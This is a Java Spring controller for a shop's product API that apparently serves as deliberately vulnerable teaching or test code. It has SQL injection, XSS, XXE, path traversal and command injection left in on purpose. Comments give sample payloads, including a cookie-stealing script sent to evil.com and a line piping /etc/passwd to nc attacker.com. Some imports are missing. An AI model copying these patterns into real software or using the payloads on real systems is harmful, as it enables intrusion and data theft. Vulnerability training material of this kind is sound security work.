package com.shop.controller;

import com.shop.service.ProductService;
import com.shop.model.Product;
import org.springframework.web.bind.annotation.*;
import javax.xml.parsers.*;
import org.w3c.dom.*;
import java.io.*;

/**
 * E-Commerce Application - Product Browsing & Search Flow
 * 
 * FLOW: Browse Products → Search → View Details → Import Catalog
 * 
 * Demonstrates vulnerabilities in the product discovery journey.
 */
@RestController
@RequestMapping("/api/products")
public class ProductController {
    
    private final ProductService productService;
    
    public ProductController(ProductService productService) {
        this.productService = productService;
    }
    
    /**
     * STEP 1: Search Products
     * VULNERABILITY: SQL Injection (CWE-89)
     * FLOW IMPACT: Data exfiltration, can dump entire product/user database
     */
    @GetMapping("/search")
    public ResponseEntity<List<Product>> searchProducts(
            @RequestParam String query,
            @RequestParam(defaultValue = "name") String sortBy,
            @RequestParam(defaultValue = "ASC") String order) {
        
        // CRITICAL: Multiple injection points
        // Query: ' UNION SELECT username, password FROM users --
        // SortBy: name; DROP TABLE products; --
        List<Product> results = productService.searchProducts(query, sortBy, order);
        
        return ResponseEntity.ok(results);
    }
    
    /**
     * STEP 2: View Product Details
     * VULNERABILITY: Reflected XSS (CWE-79)
     * FLOW IMPACT: Session hijacking when user views product
     */
    @GetMapping("/{productId}")
    public String getProductPage(@PathVariable String productId,
                                  @RequestParam(required = false) String ref) {
        Product product = productService.getProduct(productId);
        
        // CRITICAL: Reflected XSS - ref parameter in HTML
        // Attacker link: /products/123?ref=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
        return """
            <html>
            <head><title>%s</title></head>
            <body>
                <h1>%s</h1>
                <p>Price: $%s</p>
                <p>Referred by: %s</p>
            </body>
            </html>
            """.formatted(product.getName(), product.getName(), 
                         product.getPrice(), ref);  // XSS!
    }
    
    /**
     * STEP 3: Product Reviews (User Generated Content)
     * VULNERABILITY: Stored XSS (CWE-79)
     * FLOW IMPACT: Persistent attack affecting ALL users who view product
     */
    @PostMapping("/{productId}/reviews")
    public ResponseEntity<Review> addReview(@PathVariable String productId,
                                            @RequestBody ReviewRequest request) {
        // CRITICAL: No sanitization of user content
        // Attacker submits: <script>stealCookies()</script> as review
        // Every user viewing this product gets compromised
        
        Review review = new Review();
        review.setProductId(productId);
        review.setContent(request.getContent());  // Stored XSS!
        review.setRating(request.getRating());
        
        productService.saveReview(review);
        
        return ResponseEntity.ok(review);
    }
    
    /**
     * STEP 4: Import Product Catalog (Admin)
     * VULNERABILITY: XXE - XML External Entity (CVE-2014-3529)
     * FLOW IMPACT: Server file read, SSRF, DoS
     */
    @PostMapping("/import")
    public ResponseEntity<String> importCatalog(@RequestBody String xmlData) {
        try {
            // CRITICAL: XXE vulnerability
            // Attacker XML: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            // Missing: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document doc = builder.parse(new ByteArrayInputStream(xmlData.getBytes()));
            
            // Process products from XML
            NodeList products = doc.getElementsByTagName("product");
            int imported = productService.importProducts(products);
            
            return ResponseEntity.ok("Imported " + imported + " products");
            
        } catch (Exception e) {
            // VULNERABILITY: Stack trace exposure
            return ResponseEntity.status(500).body("Error: " + e.getMessage() + "\n" + 
                java.util.Arrays.toString(e.getStackTrace()));
        }
    }
    
    /**
     * STEP 5: Product Image Upload
     * VULNERABILITY: Path Traversal + Unrestricted Upload (CWE-22, CWE-434)
     * FLOW IMPACT: Webshell upload, server compromise
     */
    @PostMapping("/{productId}/image")
    public ResponseEntity<String> uploadImage(@PathVariable String productId,
                                               @RequestParam String filename,
                                               @RequestBody byte[] imageData) {
        // CRITICAL: Path traversal - attacker can write anywhere
        // filename: ../../../var/www/html/shell.jsp
        String uploadPath = "/var/uploads/products/" + filename;
        
        // CRITICAL: No file type validation
        // Attacker uploads malicious.jsp instead of image.jpg
        
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get(uploadPath), 
                imageData
            );
            return ResponseEntity.ok("Image uploaded: " + filename);
        } catch (IOException e) {
            return ResponseEntity.status(500).body("Upload failed");
        }
    }
    
    /**
     * STEP 6: Generate Product Report
     * VULNERABILITY: Command Injection (CWE-78)
     * FLOW IMPACT: Remote code execution on server
     */
    @GetMapping("/report")
    public ResponseEntity<byte[]> generateReport(@RequestParam String format,
                                                  @RequestParam String category) {
        try {
            // CRITICAL: Command injection
            // format: pdf; cat /etc/passwd | nc attacker.com 1234
            String command = "wkhtmltopdf --format " + format + 
                            " /tmp/report-" + category + ".html /tmp/report.pdf";
            
            Process process = Runtime.getRuntime().exec(command);
            
            byte[] report = process.getInputStream().readAllBytes();
            return ResponseEntity.ok(report);
            
        } catch (IOException e) {
            return ResponseEntity.status(500).body(null);
        }
    }
}

class ReviewRequest {
    private String content;
    private int rating;
    public String getContent() { return content; }
    public int getRating() { return rating; }
}

class Review {
    private String productId;
    private String content;
    private int rating;
    // setters
    public void setProductId(String id) { this.productId = id; }
    public void setContent(String c) { this.content = c; }
    public void setRating(int r) { this.rating = r; }
}
